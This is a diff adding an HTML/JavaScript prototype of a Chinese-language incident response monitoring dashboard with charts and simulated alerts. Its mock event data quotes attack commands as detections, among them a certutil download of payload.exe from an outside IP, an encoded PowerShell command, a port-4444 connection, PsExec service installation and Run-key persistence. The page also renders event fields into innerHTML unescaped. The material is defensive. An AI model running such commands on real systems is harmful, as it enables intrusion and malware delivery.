@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>实时监控中心 - 预览原型</title>
+<script src="https://cdn.jsdelivr.net/npm/echarts@5.5.0/dist/echarts.min.js"></script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
+  background: #0f1117; color: #e5e7eb; height: 100vh; overflow: hidden;
+}
+
+/* 顶部栏 */
+.header {
+  height: 48px; background: #1a1d27; border-bottom: 1px solid #2a2d37;
+  display: flex; align-items: center; padding: 0 20px; gap: 16px;
+}
+.header .logo { font-weight: 700; font-size: 15px; color: #60a5fa; }
+.header .title { font-size: 14px; color: #e5e7eb; }
+.header .badge { margin-left: auto; display: flex; align-items: center; gap: 16px; font-size: 12px; }
+.badge-item { display: flex; align-items: center; gap: 4px; color: #9ca3af; }
+.dot-online { width: 8px; height: 8px; border-radius: 50%; background: #2da44e; display: inline-block; }
+.dot-offline { width: 8px; height: 8px; border-radius: 50%; background: #6b7280; display: inline-block; }
+
+/* 布局 */
+.layout { display: flex; height: calc(100vh - 48px); }
+
+/* 左侧事件流 */
+.event-stream {
+  width: 360px; min-width: 360px; background: #13151d;
+  border-right: 1px solid #2a2d37; display: flex; flex-direction: column;
+}
+.stream-header {
+  padding: 12px 16px; font-size: 13px; font-weight: 600;
+  border-bottom: 1px solid #2a2d37; display: flex; justify-content: space-between; align-items: center;
+}
+.stream-header .count { font-size: 11px; color: #6b7280; font-weight: 400; }
+.stream-body { flex: 1; overflow-y: auto; padding: 4px 0; }
+.stream-item {
+  padding: 8px 16px; border-bottom: 1px solid #1a1d27; cursor: pointer;
+  transition: background .15s; font-size: 12px;
+}
+.stream-item:hover { background: #1a1d27; }
+.stream-item .s-time { font-size: 10px; color: #6b7280; font-family: monospace; }
+.stream-item .s-tag {
+  display: inline-block; padding: 1px 6px; border-radius: 3px;
+  font-size: 10px; font-weight: 600; margin-right: 6px;
+}
+.tag-critical { background: #450a0a; color: #fca5a5; }
+.tag-high { background: #451a03; color: #fcd34d; }
+.tag-medium { background: #0c1929; color: #93c5fd; }
+.tag-low { background: #1a1d27; color: #9ca3af; }
+.stream-item .s-msg { color: #d1d5db; margin-top: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.stream-item .s-host { font-size: 10px; color: #6b7280; margin-top: 1px; }
+.stream-item.new { animation: flashRow 1s ease; }
+@keyframes flashRow {
+  0% { background: rgba(96,165,250,0.1); }
+  100% { background: transparent; }
+}
+.stream-footer {
+  padding: 8px 16px; border-top: 1px solid #2a2d37;
+  font-size: 11px; color: #6b7280; text-align: center;
+}
+
+/* 主面板 */
+.main-panel { flex: 1; overflow-y: auto; padding: 16px 20px; }
+
+/* 统计卡片 */
+.stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 16px; }
+.stat-card {
+  background: #1a1d27; border: 1px solid #2a2d37; border-radius: 8px;
+  padding: 14px 16px; position: relative;
+}
+.stat-card .s-label { font-size: 11px; color: #6b7280; margin-bottom: 2px; }
+.stat-card .s-value { font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+.stat-card .s-sub { font-size: 11px; color: #6b7280; margin-top: 4px; }
+.stat-card .s-rate { position: absolute; right: 14px; top: 14px; font-size: 11px; padding: 2px 8px; border-radius: 10px; }
+.rate-up { background: #450a0a; color: #fca5a5; }
+.rate-down { background: #0a2e1a; color: #86efac; }
+.stat-card .s-value.critical { color: #fca5a5; }
+.stat-card .s-value.high { color: #fcd34d; }
+.stat-card .s-value.medium { color: #93c5fd; }
+.stat-card .s-value.green { color: #86efac; }
+
+/* 图表行 */
+.chart-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px; }
+.chart-card {
+  background: #1a1d27; border: 1px solid #2a2d37; border-radius: 8px; padding: 14px 16px;
+}
+.chart-card .c-title { font-size: 13px; font-weight: 600; margin-bottom: 2px; }
+.chart-card .c-sub { font-size: 11px; color: #6b7280; margin-bottom: 12px; }
+.chart-box { width: 100%; height: 200px; }
+
+/* 底部面板 */
+.bottom-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.panel {
+  background: #1a1d27; border: 1px solid #2a2d37; border-radius: 8px; padding: 14px 16px;
+}
+.panel .p-title { font-size: 13px; font-weight: 600; margin-bottom: 10px; display: flex; justify-content: space-between; }
+.panel .p-link { font-size: 11px; color: #60a5fa; cursor: pointer; font-weight: 400; }
+
+/* 告警列表 */
+.alert-item {
+  display: flex; align-items: center; gap: 10px; padding: 8px 0;
+  border-bottom: 1px solid #1a1d27; font-size: 12px;
+}
+.alert-item:last-child { border-bottom: none; }
+.alert-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+.ad-critical { background: #ef4444; }
+.ad-high { background: #f59e0b; }
+.ad-medium { background: #3b82f6; }
+.alert-body { flex: 1; min-width: 0; }
+.alert-title { color: #e5e7eb; }
+.alert-meta { font-size: 10px; color: #6b7280; margin-top: 1px; }
+.alert-time { font-size: 10px; color: #6b7280; white-space: nowrap; }
+
+/* 主机状态 */
+.host-item {
+  display: flex; align-items: center; gap: 8px; padding: 6px 0;
+  border-bottom: 1px solid #1a1d27; font-size: 12px;
+}
+.host-item:last-child { border-bottom: none; }
+.host-item .h-dot { width: 6px; height: 6px; border-radius: 50%; }
+.h-online { background: #2da44e; box-shadow: 0 0 4px rgba(45,164,78,0.4); }
+.h-offline { background: #6b7280; }
+.host-item .h-name { color: #e5e7eb; width: 100px; }
+.host-item .h-status { font-size: 10px; color: #6b7280; }
+.host-item .h-time { margin-left: auto; font-size: 10px; color: #6b7280; font-family: monospace; }
+.host-item .h-agent { font-size: 10px; color: #4b5563; margin-left: 8px; }
+
+/* 事件详情浮窗 */
+.detail-overlay {
+  position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 100;
+  display: none; backdrop-filter: blur(4px);
+}
+.detail-overlay.open { display: block; }
+.detail-panel {
+  position: fixed; left: 380px; right: 0; bottom: 0; top: 48px;
+  background: #13151d; z-index: 101; display: none; overflow-y: auto;
+  border-left: 1px solid #2a2d37;
+}
+.detail-panel.open { display: block; }
+.detail-header {
+  padding: 16px 24px; border-bottom: 1px solid #2a2d37;
+  display: flex; justify-content: space-between; align-items: center;
+}
+.detail-header .d-title { font-size: 15px; font-weight: 600; }
+.detail-close { cursor: pointer; color: #6b7280; font-size: 18px; }
+.detail-body { padding: 20px 24px; }
+.detail-body .field { margin-bottom: 16px; }
+.detail-body .f-label { font-size: 10px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+.detail-body .f-value { font-size: 13px; color: #e5e7eb; word-break: break-all; }
+.detail-body .f-value.mono { font-family: 'SF Mono', monospace; font-size: 12px; background: #1a1d27; padding: 8px 12px; border-radius: 4px; }
+.detail-body .divider { height: 1px; background: #2a2d37; margin: 16px 0; }
+
+.status-bar {
+  position: fixed; bottom: 0; left: 0; right: 0; height: 28px;
+  background: #1a1d27; border-top: 1px solid #2a2d37;
+  display: flex; align-items: center; padding: 0 20px; font-size: 11px; color: #6b7280; gap: 20px;
+}
+.status-bar .sb-item { display: flex; align-items: center; gap: 4px; }
+.status-bar .sb-dot { width: 6px; height: 6px; border-radius: 50%; }
+.sb-green { background: #2da44e; }
+.sb-yellow { background: #f59e0b; }
+</style>
+</head>
+<body>
+<div class="header">
+  <span class="logo">IR Platform</span>
+  <span class="title">🚨 实时监控中心</span>
+  <div class="badge">
+    <span class="badge-item"><span class="dot-online"></span>14 在线</span>
+    <span class="badge-item"><span class="dot-offline"></span>3 离线</span>
+    <span class="badge-item">📊 今日事件 1,247</span>
+    <span class="badge-item" id="clock"></span>
+  </div>
+</div>
+
+<div class="layout">
+  <!-- 左侧事件流 -->
+  <div class="event-stream">
+    <div class="stream-header">
+      <span>📡 实时事件流</span>
+      <span class="count">1,247 条/今</span>
+    </div>
+    <div class="stream-body" id="eventList"></div>
+    <div class="stream-footer">🟢 已连接 · 事件实时推送中</div>
+  </div>
+
+  <!-- 主面板 -->
+  <div class="main-panel">
+    <!-- 统计卡片 -->
+    <div class="stats">
+      <div class="stat-card">
+        <div class="s-label">今日事件</div>
+        <div class="s-value medium">1,247</div>
+        <div class="s-sub">较昨日 <span style="color:#fca5a5;">↑ 23%</span></div>
+        <span class="s-rate rate-up">+12%</span>
+      </div>
+      <div class="stat-card">
+        <div class="s-label">紧急告警</div>
+        <div class="s-value critical">23</div>
+        <div class="s-sub">待处置 <span style="color:#fca5a5;">14</span> 条</div>
+        <span class="s-rate rate-up">+5</span>
+      </div>
+      <div class="stat-card">
+        <div class="s-label">规则命中</div>
+        <div class="s-value high">3,891</div>
+        <div class="s-sub">活跃规则 42 条</div>
+        <span class="s-rate rate-down">-3%</span>
+      </div>
+      <div class="stat-card">
+        <div class="s-label">事件速率</div>
+        <div class="s-value green">12.3</div>
+        <div class="s-sub">条/秒 · 峰值 47.2</div>
+        <span class="s-rate" style="background:#0c1929;color:#93c5fd;">平稳</span>
+      </div>
+    </div>
+
+    <!-- 图表行 -->
+    <div class="chart-row">
+      <div class="chart-card">
+        <div class="c-title">实时事件速率</div>
+        <div class="c-sub">最近 30 分钟 · 条/分钟</div>
+        <div class="chart-box" id="eventRateChart"></div>
+      </div>
+      <div class="chart-card">
+        <div class="c-title">告警严重度分布</div>
+        <div class="c-sub">按严重度占比</div>
+        <div class="chart-box" id="severityChart"></div>
+      </div>
+    </div>
+
+    <!-- 底部 -->
+    <div class="bottom-row">
+      <div class="panel">
+        <div class="p-title">
+          <span>🔔 最近告警</span>
+          <span class="p-link" onclick="window.open('/alerts','_self')">查看全部 →</span>
+        </div>
+        <div id="recentAlerts"></div>
+      </div>
+      <div class="panel">
+        <div class="p-title">
+          <span>🖥 主机在线状态</span>
+          <span class="p-link">主机列表 →</span>
+        </div>
+        <div id="hostList"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 详情浮窗 -->
+<div class="detail-overlay" id="detailOverlay" onclick="closeDetail()"></div>
+<div class="detail-panel" id="detailPanel">
+  <div class="detail-header">
+    <span class="d-title" id="detailTitle">事件详情</span>
+    <span class="detail-close" onclick="closeDetail()">✕</span>
+  </div>
+  <div class="detail-body" id="detailBody"></div>
+</div>
+
+<!-- 底部状态栏 -->
+<div class="status-bar">
+  <span class="sb-item"><span class="sb-dot sb-green"></span> 事件通道 在线</span>
+  <span class="sb-item"><span class="sb-dot sb-green"></span> WebSocket 已连接</span>
+  <span class="sb-item"><span class="sb-dot sb-yellow"></span> 近 5 分钟事件: 127 条</span>
+  <span class="sb-item" style="margin-left:auto;">Agent v1.0 · 最后事件: <span id="lastEvent">刚刚</span></span>
+</div>
+
+<script>
+// ===== 模拟数据 =====
+const eventTypes = [
+  { type: 'process_create', tag: 'CRIT', tagClass: 'tag-critical', msg: '进程创建 certutil.exe -urlcache http://185.220.101.1/payload.exe', host: 'WEB-SRV-01', detail: { pid: 3204, ppid: 2010, process: 'certutil.exe', path: 'C:\\Windows\\System32\\certutil.exe', cmd: 'certutil -urlcache -split http://185.220.101.1/payload.exe C:\\Users\\Public\\payload.exe', user: 'SYSTEM', signed: true, signer: 'Microsoft Corporation' } },
+  { type: 'process_create', tag: 'HIGH', tagClass: 'tag-high', msg: '进程创建 powershell.exe -enc SQBFAFgA...', host: 'TEST-PC-001', detail: { pid: 5678, ppid: 1, process: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', cmd: 'powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', user: 'admin' } },
+  { type: 'new_connection', tag: 'HIGH', tagClass: 'tag-high', msg: '新建外连 45.33.32.156:4444 · svchost.exe', host: 'DB-SRV-02', detail: { pid: 2010, process: 'svchost.exe', local: '192.168.1.60:49152', remote: '45.33.32.156:4444', protocol: 'TCP', state: 'ESTABLISHED' } },
+  { type: 'service_install', tag: 'CRIT', tagClass: 'tag-critical', msg: '新服务注册 PSEXESVC · 路径可疑', host: 'FILE-SRV-01', detail: { service: 'PSEXESVC', path: 'C:\\Windows\\Temp\\psexec.exe', start_type: 'auto', user: 'LocalSystem' } },
+  { type: 'file_create', tag: 'HIGH', tagClass: 'tag-high', msg: '敏感目录文件创建 C:\\Users\\Public\\svchost.exe', host: 'TEST-PC-001', detail: { file: 'svchost.exe', path: 'C:\\Users\\Public\\svchost.exe', size: '123,456 bytes', pid: 5678, process: 'cmd.exe' } },
+  { type: 'user_login', tag: 'MED', tagClass: 'tag-medium', msg: '管理员远程登录 admin · 10.0.0.50', host: 'DC-01', detail: { user: 'admin', source: '10.0.0.50', type: 'RDP', event_id: 4624 } },
+  { type: 'process_term', tag: 'MED', tagClass: 'tag-medium', msg: '进程终止 lsass.exe · PID 720 · 异常退出', host: 'FILE-SRV-01', detail: { pid: 720, process: 'lsass.exe', exit_code: 0xC0000005, user: 'SYSTEM' } },
+  { type: 'dns_query', tag: 'MED', tagClass: 'tag-medium', msg: 'DNS 解析可疑域名 botnet-c2.example.net', host: 'WEB-SRV-01', detail: { domain: 'botnet-c2.example.net', pid: 2010, process: 'svchost.exe', resolver: '8.8.8.8' } },
+  { type: 'registry_change', tag: 'LOW', tagClass: 'tag-low', msg: '注册表修改 Run 键 · HKCU\\...\\Run\\Malware', host: 'TEST-PC-001', detail: { key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareService', value: 'C:\\Users\\Public\\svchost.exe' } },
+  { type: 'process_create', tag: 'HIGH', tagClass: 'tag-high', msg: '进程创建 wscript.exe C:\\Users\\admin\\macro.vbs', host: 'MAIL-SRV-01', detail: { pid: 8901, process: 'wscript.exe', cmd: 'wscript "C:\\Users\\admin\\AppData\\Local\\Temp\\invoice_2026.vbs"', user: 'admin' } },
+  { type: 'service_stop', tag: 'HIGH', tagClass: 'tag-high', msg: '安全服务停止 WinDefend · 已禁用', host: 'DC-01', detail: { service: 'WinDefend', status: 'stopped', start_type: 'disabled' } },
+  { type: 'new_connection', tag: 'MED', tagClass: 'tag-medium', msg: '新建连接 10.0.0.50:445 · SMB 横向移动可疑', host: 'DB-SRV-02', detail: { pid: 4, process: 'System', local: '192.168.1.60:445', remote: '10.0.0.50:49185', protocol: 'TCP', state: 'ESTABLISHED' } },
+];
+
+const severities = ['critical', 'high', 'medium', 'low'];
+const severityLabels = { critical: 'CRIT', high: 'HIGH', medium: 'MED', low: 'LOW' };
+const severityTags = { critical: 'tag-critical', high: 'tag-high', medium: 'tag-medium', low: 'tag-low' };
+
+const hosts = [
+  { name: 'WEB-SRV-01', ip: '192.168.1.50', online: true, agent: 'v1.0', lastBeat: '3s ago' },
+  { name: 'DB-SRV-02', ip: '192.168.1.60', online: true, agent: 'v1.0', lastBeat: '8s ago' },
+  { name: 'TEST-PC-001', ip: '192.168.1.100', online: true, agent: 'v1.0', lastBeat: '12s ago' },
+  { name: 'FILE-SRV-01', ip: '192.168.1.70', online: true, agent: 'v0.9', lastBeat: '5s ago' },
+  { name: 'DC-01', ip: '192.168.1.10', online: true, agent: 'v1.0', lastBeat: '22s ago' },
+  { name: 'MAIL-SRV-01', ip: '192.168.1.80', online: false, agent: '-', lastBeat: '离线 5m' },
+  { name: 'APP-SRV-01', ip: '192.168.1.90', online: false, agent: '-', lastBeat: '离线 12m' },
+  { name: 'GITLAB-01', ip: '192.168.1.110', online: false, agent: '-', lastBeat: '离线 32m' },
+];
+
+let eventId = 0;
+const eventLog = [];
+
+// ===== 事件流 =====
+function addEvent(evtData) {
+  const t = new Date();
+  const time = t.toLocaleTimeString('zh-CN', { hour12: false });
+  const sev = evtData.severity || 'medium';
+  
+  const item = document.createElement('div');
+  item.className = 'stream-item new';
+  item.innerHTML = `
+    <div><span class="stream-item-time" style="font-size:10px;color:#6b7280;font-family:monospace;">${time}</span></div>
+    <div style="margin-top:2px;">
+      <span class="s-tag ${severityTags[sev]}">${severityLabels[sev]}</span>
+      <span style="color:#d1d5db;font-size:12px;">${evtData.msg}</span>
+    </div>
+    <div class="s-host">${evtData.host}</div>
+  `;
+  item.onclick = () => showDetail(evtData);
+  
+  const list = document.getElementById('eventList');
+  list.insertBefore(item, list.firstChild);
+  if (list.children.length > 100) list.lastChild.remove();
+  
+  eventLog.unshift({ time, ...evtData });
+  document.getElementById('lastEvent').textContent = time;
+  
+  // 声音提醒（critical/high）
+  if (sev === 'critical' || sev === 'high') {
+    // 简化的视觉提醒：闪烁标题
+    document.querySelector('.header').style.transition = 'background .3s';
+    document.querySelector('.header').style.background = sev === 'critical' ? '#450a0a' : '#451a03';
+    setTimeout(() => document.querySelector('.header').style.background = '#1a1d27', 500);
+  }
+}
+
+// ===== 模拟推送 =====
+function simulateEvent() {
+  const evt = eventTypes[Math.floor(Math.random() * eventTypes.length)];
+  const sevMap = { CRIT: 'critical', HIGH: 'high', MED: 'medium', LOW: 'low' };
+  addEvent({ severity: sevMap[evt.tag] || 'medium', msg: evt.msg, host: evt.host, detail: evt.detail });
+}
+function simulateBurst() {
+  for (let i = 0; i < 4; i++) setTimeout(simulateEvent, i * 300);
+}
+
+// 初始加载一批
+for (let i = 0; i < 12; i++) {
+  const evt = eventTypes[i % eventTypes.length];
+  const sevMap = { CRIT: 'critical', HIGH: 'high', MED: 'medium', LOW: 'low' };
+  setTimeout(() => addEvent({ severity: sevMap[evt.tag], msg: evt.msg, host: evt.host }), i * 200);
+}
+
+// 持续模拟
+setInterval(simulateEvent, 3000);
+setInterval(simulateBurst, 30000);
+
+// ===== 详情浮窗 =====
+function showDetail(evt) {
+  const d = evt.detail || {};
+  const panel = document.getElementById('detailPanel');
+  const overlay = document.getElementById('detailOverlay');
+  
+  document.getElementById('detailTitle').textContent = `🔍 ${evt.msg}`;
+  
+  let html = '';
+  for (const [key, val] of Object.entries(d)) {
+    const label = key.replace(/_/g, ' ').replace(/\b\w/g, l => l.toUpperCase());
+    html += `<div class="field"><div class="f-label">${label}</div>`;
+    if (key === 'cmd' || key === 'path') {
+      html += `<div class="f-value mono">${val}</div>`;
+    } else {
+      html += `<div class="f-value">${val}</div>`;
+    }
+    html += `</div>`;
+  }
+  html += `<div class="divider"></div>`;
+  html += `<div class="field"><div class="f-label">原始事件</div><div class="f-value mono">${JSON.stringify(evt, null, 2)}</div></div>`;
+  
+  document.getElementById('detailBody').innerHTML = html;
+  panel.classList.add('open');
+  overlay.classList.add('open');
+}
+
+function closeDetail() {
+  document.getElementById('detailPanel').classList.remove('open');
+  document.getElementById('detailOverlay').classList.remove('open');
+}
+
+// ===== 最近告警 =====
+function renderAlerts() {
+  const container = document.getElementById('recentAlerts');
+  const alerts = [
+    { severity: 'critical', title: 'certutil 远程下载执行', host: 'WEB-SRV-01', time: '2 分钟前' },
+    { severity: 'high', title: 'PSEXESVC 服务安装', host: 'FILE-SRV-01', time: '5 分钟前' },
+    { severity: 'high', title: 'PowerShell 编码命令执行', host: 'TEST-PC-001', time: '8 分钟前' },
+    { severity: 'medium', title: 'IOC 命中 botnet-c2.example.net', host: 'WEB-SRV-01', time: '15 分钟前' },
+    { severity: 'high', title: '安全服务 WinDefend 已禁用', host: 'DC-01', time: '22 分钟前' },
+  ];
+  container.innerHTML = alerts.map(a => `
+    <div class="alert-item">
+      <span class="alert-dot ad-${a.severity}"></span>
+      <div class="alert-body">
+        <div class="alert-title">${a.title}</div>
+        <div class="alert-meta">${a.host}</div>
+      </div>
+      <span class="alert-time">${a.time}</span>
+    </div>
+  `).join('');
+}
+
+// ===== 主机状态 =====
+function renderHosts() {
+  const container = document.getElementById('hostList');
+  container.innerHTML = hosts.map(h => `
+    <div class="host-item">
+      <span class="h-dot ${h.online ? 'h-online' : 'h-offline'}"></span>
+      <span class="h-name">${h.name}</span>
+      <span class="h-status">${h.online ? '在线' : '离线'}</span>
+      <span class="h-agent">${h.agent}</span>
+      <span class="h-time">${h.lastBeat}</span>
+    </div>
+  `).join('');
+}
+
+// ===== ECharts 事件速率 =====
+(function() {
+  const chart = echarts.init(document.getElementById('eventRateChart'));
+  const now = new Date();
+  const labels = [];
+  const data = [];
+  for (let i = 29; i >= 0; i--) {
+    const t = new Date(now - i * 60000);
+    labels.push(t.getHours() + ':' + String(t.getMinutes()).padStart(2, '0'));
+    data.push(Math.floor(Math.random() * 30) + 5 + Math.sin(i * 0.5) * 15);
+  }
+  chart.setOption({
+    tooltip: { trigger: 'axis', backgroundColor: '#1a1d27', borderColor: '#2a2d37', textStyle: { color: '#e5e7eb', fontSize: 11 } },
+    grid: { left: 40, right: 10, top: 10, bottom: 20 },
+    xAxis: { type: 'category', data: labels, axisLine: { lineStyle: { color: '#2a2d37' } }, axisLabel: { color: '#6b7280', fontSize: 10 } },
+    yAxis: { type: 'value', splitLine: { lineStyle: { color: '#2a2d37', type: 'dashed' } }, axisLabel: { color: '#6b7280', fontSize: 10 } },
+    series: [{
+      type: 'line', smooth: true, symbol: 'none', lineStyle: { color: '#60a5fa', width: 2 },
+      areaStyle: { color: { type: 'linear', x: 0, y: 0, x2: 0, y2: 1, colorStops: [{ offset: 0, color: 'rgba(96,165,250,0.2)' }, { offset: 1, color: 'rgba(96,165,250,0)' }] } },
+      data: data,
+      markLine: { silent: true, data: [{ yAxis: 50, label: { show: true, formatter: '告警阈值', color: '#fca5a5', fontSize: 10 }, lineStyle: { color: '#ef4444', type: 'dashed' } }] }
+    }]
+  });
+  window.addEventListener('resize', () => chart.resize());
+})();
+
+// ===== ECharts 严重度分布 =====
+(function() {
+  const chart = echarts.init(document.getElementById('severityChart'));
+  chart.setOption({
+    tooltip: { trigger: 'item', backgroundColor: '#1a1d27', borderColor: '#2a2d37', textStyle: { color: '#e5e7eb', fontSize: 11 } },
+    series: [{
+      type: 'pie', radius: ['50%', '70%'], avoidLabelOverlap: true,
+      itemStyle: { borderRadius: 4, borderColor: '#13151d', borderWidth: 2 },
+      label: { show: true, formatter: '{b}\n{d}%', fontSize: 10, color: '#9ca3af', lineHeight: 14 },
+      data: [
+        { value: 23, name: '严重', itemStyle: { color: '#ef4444' } },
+        { value: 67, name: '高危', itemStyle: { color: '#f59e0b' } },
+        { value: 156, name: '中危', itemStyle: { color: '#3b82f6' } },
+        { value: 432, name: '低危', itemStyle: { color: '#6b7280' } },
+      ]
+    }]
+  });
+  window.addEventListener('resize', () => chart.resize());
+})();
+
+// ===== 时钟 =====
+function updateClock() {
+  document.getElementById('clock').textContent = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
+}
+updateClock();
+setInterval(updateClock, 1000);
+
+// ===== 渲染 =====
+renderAlerts();
+renderHosts();
+</script>
+</body>
+</html>
